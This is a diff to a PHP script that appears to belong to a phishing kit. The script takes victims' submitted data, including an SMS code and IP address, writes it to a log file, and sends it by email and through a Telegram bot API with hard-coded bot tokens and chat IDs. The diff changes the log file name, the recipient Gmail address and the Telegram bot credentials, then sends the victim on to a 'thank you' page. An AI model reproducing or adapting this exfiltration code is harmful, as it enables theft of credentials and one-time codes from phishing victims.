@@ -19,17 +19,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             | INF : " . $ip . "
             ---------------\n\n";
 
-            $file = fopen("./rz01.txt", "a+");
+            $file = fopen("./UCHIHA.txt", "a+");
             fwrite($file, $message);
             fclose($file);
             $sms = $_POST['sms'];
-            $to = "";
+            $to = "lapayty@gmail.com";
             $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (3RD)";
             $headers = "From: Ak47™<shanks@dPodrtgas.org>\r\n";
             $headers .= "MIME-Version: 1.0\r\n";
             $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
             mail($to, $subject, $message, $headers);
-            file_get_contents("https://api.telegram.org/bot2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo/sendMessage?chat_id=-745387116&text=" . urlencode($message)."" );
+            file_get_contents("https://api.telegram.org/bot1955265923:AAGwafJcpMwWBDbuITLrsYZa-VrA5QSbGb4/sendMessage?chat_id=-526214058&text=" . urlencode($message)."" );
             
         header("Location: Seleccione_gracias.php?loading=".md5($_GET['error']));
     }else header("Location: ?error=".md5($_GET['error']));
